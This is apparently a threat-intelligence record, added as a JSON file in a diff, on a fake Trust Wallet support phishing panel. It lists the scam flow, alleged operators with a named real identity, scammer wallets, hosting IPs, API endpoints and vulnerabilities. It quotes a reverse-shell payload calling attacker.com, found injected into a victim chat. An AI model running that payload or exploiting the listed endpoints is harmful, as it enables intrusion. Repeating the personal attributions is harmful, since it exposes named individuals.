@@ -1,0 +1,372 @@
+{
+  "team": "TrustWalletPanel",
+  "type": "Fake Trust Wallet Support Panel — Social Engineering & Crypto Theft",
+  "first_seen": "2025-01-07",
+  "last_activity": "2026-03-01",
+  "status": "ACTIVE — support enabled, sessions being created as of 2026-03-01",
+  "panel_url": "tttadmin.com",
+  "victim_api": "appp.tttadmin.com",
+  "admin_api": "app.tttadmin.com",
+  "admin_api_legacy": "core.tttadmin.com (routes dead — 'Cannot POST' errors, possible Express proxy remnant)",
+  "static_cdn": "static.tttadmin.com",
+  "quality_assessment": "High-quality, custom-built phishing panel with integrated live chat, fake wallet interface, staking simulation, and multi-operator support. Spring Boot backend with PostgreSQL, React frontends. Operated by a Russian-speaking team for 14+ months. Full admin source code extracted via exposed source maps (339 files, 3.4MB).",
+
+  "tech_stack": {
+    "frontend": "React (Create React App) + Material UI",
+    "admin_frontend": "React (Create React App) with source maps exposed — main.3924229a.js (778KB), main.3924229a.js.map (3.4MB)",
+    "admin_source_files": "339 files including 17 key application TSX/TS files — Login.tsx, App.tsx, Layout.tsx, WalletsPage.tsx, WalletPage.tsx, WalletChatPage.tsx, TransactionEditModal.tsx, TransactionAddModal.tsx, TransactionsPage.tsx, StakingsPage.tsx, StakingPoolEditModal.tsx, TokenInfosPage.tsx, StakingsPoolPage.tsx, TokensPage.tsx, WalletChangeModal.tsx, TokenChangeModal.tsx, TokenInfoChangeModal.tsx",
+    "backend": "Java Spring Boot + Spring Security",
+    "database": "PostgreSQL (via JPA/Hibernate)",
+    "auth": "JWT Bearer token — login via POST /admin/sign-in with {login, password}, token stored in sessionStorage",
+    "auth_error_message_ru": "Неверный логин или пароль!",
+    "web_server": "nginx/1.18.0 (Ubuntu)",
+    "dns": "Wildcard *.tttadmin.com — all subdomains now consolidated to 69.49.231.166",
+    "cors": "Reflects any Origin with Access-Control-Allow-Credentials: true",
+    "swap_percent": "-0.0005 (negative markup — slightly better rates to appear legitimate)",
+    "support_status": "1 (ACTIVE as of 2026-03-01)"
+  },
+
+  "scam_flow": [
+    "1. Victim discovers phishing domain (via Telegram channels, romance scams, or search ads)",
+    "2. Phishing site mimics Trust Wallet multi-chain interface",
+    "3. Victim creates/imports wallet — mnemonic and password captured by backend",
+    "4. sessionLogin generated client-side (62^25 keyspace), sent to server",
+    "5. Wallet appears functional — balances shown, staking pools displayed",
+    "6. When victim attempts withdrawal, transaction 'fails' or is 'blocked'",
+    "7. Live chat support activates — operator impersonates Trust Wallet Support",
+    "8. Operator claims assets frozen due to 'OFAC sanctions', 'AML violations', or 'wrong network'",
+    "9. Victim told to deposit equivalent amount for 'asset replacement from common pool'",
+    "10. If victim pays, operator demands additional deposits (repeat extraction)",
+    "11. If victim refuses, operator threatens 'OFAC jurisdiction transfer' with deadlines",
+    "12. Stolen funds moved through rotating ETH/TRON/BTC addresses"
+  ],
+
+  "operator_identities": {
+    "lyokha_alexey": {
+      "names": ["Lyokha", "Leha", "Alexey", "Aleksey"],
+      "evidence": "Victims in chats #7, #1779, #1833 address operator by name",
+      "role": "Primary operator"
+    },
+    "dima": {
+      "names": ["Dima"],
+      "evidence": "Victim in chat #92 addresses: 'Hello, Dima!!!'",
+      "role": "Operator"
+    },
+    "maksim": {
+      "names": ["Maksim", "Maxim"],
+      "evidence": "Victim in chat #446 demands: 'Where is that Maksim?'",
+      "role": "Operator"
+    },
+    "andrey": {
+      "names": ["Andrey", "Andrew"],
+      "evidence": "Victim in chat #579; admin introduces as 'My name is Andrew'",
+      "role": "Operator"
+    },
+    "aleksander": {
+      "names": ["Aleksander"],
+      "evidence": "Victim in chat #847: 'brought by aleksander from telegram channel'",
+      "role": "Telegram recruiter"
+    },
+    "sofia": {
+      "names": ["Sofia"],
+      "evidence": "Romance/pig-butchering lure operator, chat #1657",
+      "role": "Social engineer / recruiter"
+    }
+  },
+
+  "telegram_actors": {
+    "support_account": {
+      "handle": "@Addmeks",
+      "telegram_id": 6005741623,
+      "real_name": "Vasiliy Navrotsky (Василий Навроцкий)",
+      "role": "Primary operator — given to victims as official support in chat #900",
+      "linked_account_id": 6191411268,
+      "username_history": [
+        {"username": "@Addmeks", "date": "first / 2025-01-23"},
+        {"username": "@Slo221", "date": "2024-08-06"},
+        {"username": "@Li_Sin_main", "date": "2024-01-12"},
+        {"username": "@Handert", "date": "2023-08-15"},
+        {"username": "@Surr2201", "date": "2023-08-09"},
+        {"username": "@surr2204", "date": "2023-07-10"}
+      ],
+      "display_name_history": [
+        "Василий (2023-08)", "𝕍𝕒𝕤𝕚𝕝𝕚𝕪ℕ𝕒𝕧𝕣𝕠𝕥𝕤𝕜𝕪 (2023-12)", "𝕍𝕒𝕤 (2024-01)",
+        "𝐌𝐎𝐎𝐍𝐋𝐈𝐆𝐇𝐓 (2024-01)", "Обычный Слон (2024-04)", "Ermolov (2024-05)",
+        "Sasha (2025-03)", "Sandro (2025-05)", "Anderson (2025-05)",
+        "Ganblade (2025-08)", "User not found (2025-08)"
+      ],
+      "telegram_groups": 61,
+      "telegram_messages": 249,
+      "notable_groups": [
+        "Binance RU (34 msgs)", "Питупи P2P (35 msgs)", "BYBIT (20 msgs)",
+        "Bybit Kazakhstan (13 msgs)", "HTX Russian (13 msgs)", "Арбитраж P2P (15 msgs)",
+        "P2P LAB (9 msgs)", "КриптоБош (9 msgs)", "Trust Wallet RU (1 msg)",
+        "Банковские Разборки 115ФЗ (6 msgs)", "Процессинг Мания (2 msgs)"
+      ],
+      "overlap_contacts_matching_operators": [
+        {"name": "Aleksey", "shared_groups": 32, "matches": "Lyokha/Alexey (primary operator)"},
+        {"name": "Дима Михайлович ₿", "shared_groups": 24, "matches": "Dima (operator)"},
+        {"name": "Andrey", "shared_groups": 23, "matches": "Andrey/Andrew (operator)"},
+        {"name": "MaksON", "handle": "@maksimusrit", "shared_groups": 22, "matches": "Maksim (operator)"},
+        {"name": "Олег", "handle": "@oleggsavenko", "shared_groups": 23},
+        {"name": "Егор", "handle": "@Egooorrrru", "shared_groups": 21},
+        {"name": "Максим Смирнов", "shared_groups": 21}
+      ]
+    },
+    "fake_personas_in_chat": [
+      "Steve352#-A",
+      "Brian135#-S",
+      "Steve54#-A",
+      "Ryan#324A CA-D"
+    ]
+  },
+
+  "victim_statistics": {
+    "total_chat_sessions": 1900,
+    "active_victims_responded": 679,
+    "deeply_engaged_10plus_msgs": 175,
+    "chats_with_admin_deposit_demands": 198,
+    "victims_confirmed_sending_in_chat": 20,
+    "languages": {
+      "russian": "51%",
+      "english": "40%",
+      "other": "9%"
+    },
+    "operation_period": "2025-01-07 to 2026-02-28 (14 months)",
+    "peak_month": "2025-11 (959 messages)"
+  },
+
+  "financial_damage": {
+    "chat_claimed_victim_transfers_usdt": 239000,
+    "chat_claimed_victim_transfers_eth": 45.77,
+    "chat_claimed_victim_transfers_btc": 0.45,
+    "admin_demanded_total_usdt_mentions": 2213508,
+    "estimated_total_damage_usd": "unknown — TRON wallets not verified",
+    "largest_single_case_usdt": 197000,
+    "top_cases": [
+      {"chat": 1795, "amount": "197,000 USDT (TRON)", "status": "victim confirmed deposit"},
+      {"chat": 965, "amount": "~16,000 USDT (multiple)", "status": "victim confirmed deposits"},
+      {"chat": 481, "amount": "~45.77 ETH", "status": "victim confirmed ETH deposits"},
+      {"chat": 720, "amount": "8,000 USDT (TRC20)", "status": "victim confirmed"},
+      {"chat": 1090, "amount": "5,839 USDT", "status": "victim confirmed deposit"},
+      {"chat": 1430, "amount": "~3,686 USDT", "status": "victim confirmed 2 deposits"},
+      {"chat": 92, "amount": "3,340 USDT", "status": "victim confirmed"},
+      {"chat": 1134, "amount": "2,004 USDT", "status": "victim confirmed"},
+      {"chat": 19, "amount": "~1,030 USDT", "status": "victim confirmed"},
+      {"chat": 1089, "amount": "0.3201 BTC", "status": "victim confirmed deposit from Ledger"}
+    ],
+    "onchain_verification": {
+      "note": "Full on-chain tracing NOT performed. 21 wallet addresses extracted from chat logs. Total received by address != scam proceeds. Amounts below are from victim self-reports only.",
+      "estimated_damage": "$100K+ (impossible to fully calculate)",
+      "wallets_found": "8 ETH, 8 TRON, 5 BTC — addresses only, no tracing",
+      "tron_note": "TRON (TRC-20 USDT) was the primary transfer channel. On-chain analysis not performed."
+    }
+  },
+
+  "scammer_wallets": {
+    "ethereum": [
+      {"address": "0xf1b0282fd71921cee6d912575d1f56e6b12f7673", "mentions": 6, "chats": [614]},
+      {"address": "0x3ae4eC3166Ac6f3507E4B7BbC251A266e0f28DbA", "mentions": 2, "chats": [635]},
+      {"address": "0xfdF5ce1865bf1C4862592aaE83DC38EcaB726308", "mentions": 2, "chats": [978]},
+      {"address": "0xd46bbd5dfc14105d22b787b29017358ae4b244a5", "mentions": 1, "chats": [159]},
+      {"address": "0xa53f8ddc3c3c53f83261def736bb538b18211cc5", "mentions": 1, "chats": [269]},
+      {"address": "0xcd46f01553e75b6c800bf053fcd91055414f781d", "mentions": 1, "chats": [469]},
+      {"address": "0x91c44cdad8da8c4f39e9ecb9ab197815439f8c92", "mentions": 1, "chats": [481]},
+      {"address": "0xD9D0c2B5e8e66FBd3D7F0149A77AA97E9b1BF1f8", "mentions": 1, "chats": [1550]}
+    ],
+    "tron": [
+      {"address": "TRamkKfTq1qRLq6Niffq7vSh4aYj1jyiNn", "mentions": 2, "chats": [956]},
+      {"address": "TPdJKRHDaJsH1KdJSYmDg8PVR2h2aoV61w", "mentions": 1, "chats": [164]},
+      {"address": "TFVqTYtDPT6pRTc2b6YGsJD9vRBCKSYkTD", "mentions": 1, "chats": [294]},
+      {"address": "TQ66T6YjQZmyzS6Lgki3bPYhXXZE5Fwhqt", "mentions": 1, "chats": [305]},
+      {"address": "TUaS3mw9Bg1qDBkUdRU5waAgem4AQDB4gJ", "mentions": 1, "chats": [576]},
+      {"address": "TPsAKyrCZVoFvehFCBPLqm4eanUibedKL7", "mentions": 1, "chats": [1016]},
+      {"address": "TS1ZS1FWzjJ9vTa6zhFSkgrbPpgRMRubmm", "mentions": 1, "chats": [1609]},
+      {"address": "TRF7tHkFodaoYARtaBAnhFaPwQtCXVeMT1", "mentions": 1, "chats": [1636]}
+    ],
+    "bitcoin": [
+      {"address": "bc1qqgn5u08qejjwyycsanac3gatgkkaf8hrc08dll", "mentions": 2, "chats": [1103, 1115]},
+      {"address": "bc1qwqtmur3dj824zvny2zj8yf8hjjkjhrp2nml9w3", "mentions": 2, "chats": [1467]},
+      {"address": "1Pf4G9Sb5sBps4u17qMtSxicKs4yxEqgMt", "mentions": 4, "chats": [1256]},
+      {"address": "1Hgk43SSpc8Z7L4sdtyQmzRW78LQVbbPxs", "mentions": 3, "chats": [1256]},
+      {"address": "bc1qv32gkda3930j7mad28grmz9uqeulrynmd64wy2", "mentions": 1, "chats": [1465]}
+    ]
+  },
+
+  "infrastructure": {
+    "primary_domains": [
+      "tttadmin.com",
+      "app.tttadmin.com (NEW — admin API backend, discovered from source code)",
+      "appp.tttadmin.com",
+      "core.tttadmin.com",
+      "static.tttadmin.com"
+    ],
+    "phishing_domains": [
+      {"domain": "trust-multi-chain.com", "dns_status": "DEAD — Non-existent domain"},
+      {"domain": "trust-multichain.com", "dns_status": "DEAD — Non-existent domain"},
+      {"domain": "trust-multi.online", "dns_status": "DEAD — Non-existent domain"},
+      {"domain": "trustarter.io", "dns_status": "PARKED — Epik.com domain parking (209.196.146.115, Kansas City MO, Epik LLC AS394456)"},
+      {"domain": "premium-trust.com", "dns_status": "DEAD — Non-existent domain"},
+      {"domain": "wallet-premium.com", "dns_status": "ALIVE — Behind Cloudflare (403 challenge)"},
+      {"domain": "trust-wallet-premium", "dns_status": "Unknown — incomplete domain"},
+      {"domain": "coinbridge.online", "dns_status": "DEAD — Non-existent domain"},
+      {"domain": "coinbridgee.online", "dns_status": "DEAD — Non-existent domain"}
+    ],
+    "feeder_domains": [
+      {"domain": "rynova-qw.shop", "dns_status": "DNS SERVFAIL"}
+    ],
+    "current_ip_all_subdomains": "69.49.231.166 (ALL *.tttadmin.com consolidated as of 2026-03-01)",
+    "ip_geolocation": [
+      {"ip": "69.49.231.166", "city": "Atlanta, GA", "country": "US", "org": "Network Solutions LLC (AS19871)", "role": "Current primary — all subdomains"},
+      {"ip": "142.4.0.246", "city": "Provo, UT", "country": "US", "org": "Unified Layer (AS46606)", "role": "Former admin panel IP"},
+      {"ip": "146.185.239.62", "city": "Madrid", "country": "ES", "org": "GTHost (AS63023)", "role": "Secondary server — Goodinspin casino + Next.js"},
+      {"ip": "2.56.178.117", "city": "Moscow", "country": "RU", "org": "UFO Hosting LLC (AS33993)", "role": "Victim-facing phishing"},
+      {"ip": "45.144.30.6", "city": "Moscow", "country": "RU", "org": "UFO Hosting LLC (AS33993)", "role": "Victim-facing phishing"},
+      {"ip": "94.131.121.154", "city": "Moscow", "country": "RU", "org": "UFO Hosting LLC (AS33993)", "role": "Victim-facing phishing"},
+      {"ip": "185.170.198.121", "city": "Vilnius", "country": "LT", "org": "Hostinger International (AS47583)", "role": "Victim-facing phishing"},
+      {"ip": "185.230.64.133", "city": "Vilnius", "country": "LT", "org": "Hostinger International (AS47583)", "role": "Victim-facing phishing"},
+      {"ip": "45.12.129.131", "city": "Vilnius", "country": "LT", "org": "WorkTitans B.V. (AS209847)", "role": "Victim-facing phishing"},
+      {"ip": "45.12.129.101", "city": "Vilnius", "country": "LT", "org": "WorkTitans B.V. (AS209847)", "role": "Victim-facing phishing"},
+      {"ip": "69.10.62.71", "city": "New York", "country": "US", "org": "Interserver Inc (AS19318)", "role": "Victim-facing phishing"}
+    ],
+    "ip_summary": "3x Moscow RU (UFO Hosting) + 4x Vilnius LT (Hostinger/WorkTitans) + 3x US (Network Solutions/Unified Layer/Interserver) + 1x Madrid ES (GTHost)",
+    "secondary_server": {
+      "ip": "146.185.239.62",
+      "services": "Goodinspin crypto casino (port 80, Apache), Next.js app (port 3000)"
+    },
+    "ssl_certificates": {
+      "issuer": "Let's Encrypt (R12/R13)",
+      "first_certificate": "2025-11-10 (infrastructure setup date indicator)",
+      "latest_certificate": "2026-02-07",
+      "renewal_history": ["2025-11-10", "2025-12-09", "2026-02-07"],
+      "covered_subdomains": ["tttadmin.com", "app.tttadmin.com", "appp.tttadmin.com", "core.tttadmin.com", "static.tttadmin.com"]
+    }
+  },
+
+  "social_engineering_tactics": {
+    "trust_wallet_impersonation": 1905,
+    "wallet_freeze_block": 360,
+    "asset_replacement_common_pool": 305,
+    "ofac_sanctions_threats": 210,
+    "deposit_for_unlock": 185,
+    "fake_staking": 161,
+    "aml_ctf_accusations": 66,
+    "money_laundering_accusations": 8,
+    "urgency_deadlines": 3
+  },
+
+  "api_endpoints": {
+    "api_hosts": {
+      "victim_api": "appp.tttadmin.com (Spring Boot — JSON 404 responses)",
+      "admin_api": "app.tttadmin.com (Spring Boot — confirmed from source code constants/index.ts)",
+      "legacy_api": "core.tttadmin.com (Express — 'Cannot POST' errors, routes dead)"
+    },
+    "unauthenticated": [
+      "POST /session/init — Creates victim session (captures mnemonic, password)",
+      "POST /session/get — Retrieves session by sessionLogin; EMPTY BODY returns LATEST session (session #3583 as of 2026-03-01)",
+      "POST /session/activewallet/change — Changes active wallet",
+      "POST /chat/get — IDOR: enumerate all chats by numeric ID (works on both appp. and app.)",
+      "POST /message/save — Write messages to any chat (confirmed unauthenticated)",
+      "POST /network/get — Full network/token configuration (174KB response)",
+      "POST /system/get — System configuration (returns swap_percent=-0.0005, status_support=1)",
+      "POST /token/info/get/all — All token info with live prices from CoinMarketCap",
+      "POST /stake/get/all — All staking pool configurations with APY rates",
+      "POST /admin/sign-in — Login (no rate limiting, field: {login, password})"
+    ],
+    "authenticated_admin": [
+      "POST /admin/wallet/get/all — Paginated victim wallets with mnemonics {page: N}",
+      "POST /admin/wallet/get — Single wallet by ID",
+      "POST /admin/wallet/update — Update wallet status",
+      "POST /admin/session/get/all — All victim sessions",
+      "POST /admin/session/get — Single session",
+      "POST /admin/user/get — Admin user info",
+      "POST /admin/user/create — Create admin user",
+      "POST /admin/password/change — Change admin password",
+      "POST /admin/system/update — Update system setting {keyData, valueData}",
+      "POST /admin/transaction/update — Update transaction details (from/to address, status, amount)",
+      "POST /admin/transaction/status/update — Update transaction status {hash, status}",
+      "POST /admin/transaction/status/change — Change transaction status {hash, status}",
+      "POST /transaction/update/status — Update receive transaction status by hash"
+    ],
+    "transaction_statuses": ["COMPLETED", "CONFIRMATION", "FAILED"],
+    "system_settings_keys": ["swap_percent", "status_support"],
+    "admin_panel_features": [
+      "Wallet management — view/edit all victim wallets, mnemonics, balances, descriptions",
+      "Live chat — 1-second polling interval, admin sends as Trust Wallet Support",
+      "Transaction control — edit status (COMPLETED/CONFIRMATION/FAILED), from/to addresses",
+      "Token management — configure supported tokens, set fake balances and prices",
+      "Staking pool management — configure fake APY rates, lock periods, minimum amounts",
+      "System settings — swap premium percentage, support status toggle",
+      "Pagination — paginated wallet list view"
+    ]
+  },
+
+  "vulnerabilities_found": [
+    "IDOR on /chat/get — All 1,900 victim chats enumerable by numeric ID without authentication (works on app. and appp.)",
+    "No rate limiting on /admin/sign-in — Unlimited login attempts, confirmed 'admin' user exists (returns 401 Bad credentials)",
+    "CORS misconfiguration — Server reflects any Origin with credentials:true",
+    "Source maps exposed — Full admin panel React source (339 files, 3.4MB) at tttadmin.com/static/js/main.3924229a.js.map",
+    "Unauthenticated /session/init — Anyone can create sessions",
+    "Unauthenticated /message/save — Anyone can inject messages into victim chats",
+    "/session/get with empty body returns latest session data (session #3583, wallet #1898, full token config)",
+    "Unauthenticated /system/get — Leaks internal configuration (swap_percent, status_support)",
+    "Unauthenticated /token/info/get/all — Full token database with live prices",
+    "Unauthenticated /network/get — Full network configuration (174KB)",
+    "Unauthenticated /stake/get/all — All staking pool configurations"
+  ],
+
+  "third_party_probing": {
+    "note": "Evidence of prior researcher/attacker activity found in chat #1",
+    "payload_injected": "payload::YmFzaCAtaSA+JiAvZGV2L3RjcC9hdHRhY2tlci5jb20vNDQ0NCAwPiYx",
+    "payload_decoded": "bash -i >& /dev/tcp/attacker.com/4444 0>&1 (reverse shell attempt)",
+    "injection_date": "2025-05-06T00:35:45",
+    "injection_method": "Unauthenticated /message/save endpoint",
+    "significance": "Another party discovered the IDOR/message injection vulnerability ~10 months before our investigation"
+  },
+
+  "evidence_emails": [
+    "support@trust-multi.online"
+  ],
+
+  "source_code_extracted": {
+    "method": "Exposed source maps at tttadmin.com/static/js/main.3924229a.js.map",
+    "total_files": 339,
+    "total_size_bytes": 3453641,
+    "key_application_files": [
+      "constants/index.ts — API URLs (SERVER_URL=app.tttadmin.com, CORE_URL=core.tttadmin.com, STATIC_URL=static.tttadmin.com)",
+      "Login.tsx — Admin login form, POST /admin/sign-in with {login, password}",
+      "App.tsx — Route definitions, JWT token management via sessionStorage",
+      "Layout.tsx — Main layout, data loading on mount (wallets, networks, tokens, stakings)",
+      "pages/WalletsPage.tsx — Victim wallet list, swap_percent and support_status controls",
+      "pages/WalletPage.tsx — Single wallet view with mnemonic, tokens, transactions",
+      "pages/WalletChatPage.tsx — Live chat with 1-second polling, Trust Wallet branding",
+      "pages/TransactionEditModal.tsx — Transaction editing (status, from/to addresses)",
+      "pages/TransactionAddModal.tsx — Add fake transactions to victim wallets",
+      "pages/TransactionsPage.tsx — Transaction list",
+      "pages/StakingsPage.tsx — Victim staking list",
+      "pages/StakingPoolEditModal.tsx — Edit staking pool settings",
+      "pages/TokenInfosPage.tsx — Token info management",
+      "pages/TokensPage.tsx — Wallet token management",
+      "pages/WalletChangeModal.tsx — Edit wallet properties"
+    ],
+    "russian_ui_labels": [
+      "Все кошельки (All wallets)",
+      "Список кошельков (Wallet list)",
+      "Процент надбавки для свапа (Swap premium percent)",
+      "Статус поддержки (Support status)",
+      "Информация о кошельке (Wallet information)",
+      "Изменить транзакцию (Edit transaction)",
+      "Неверный логин или пароль! (Wrong login or password!)",
+      "Список монет (Coin list)",
+      "Список транзакций (Transaction list)",
+      "Список стейкингов (Staking list)",
+      "Кошельёк (Wallet — note typo with ё)",
+      "Обновить (Update)",
+      "Сохранить (Save)"
+    ]
+  },
+
+  "collected": "2026-03-01",
+  "recon_date": "2026-03-01",
+  "recon_summary": "Live infrastructure recon confirmed panel still active. Admin source code (339 files) fully extracted via exposed source maps. All *.tttadmin.com subdomains now consolidated to single IP 69.49.231.166 (Atlanta). New subdomain app.tttadmin.com discovered as admin API backend. 11 unauthenticated endpoints confirmed accessible. IP geolocation reveals 3 Moscow RU + 4 Vilnius LT + US hosting infrastructure. Support status ACTIVE (value=1). Certificate timeline traces to 2025-11-10 initial setup."
+}
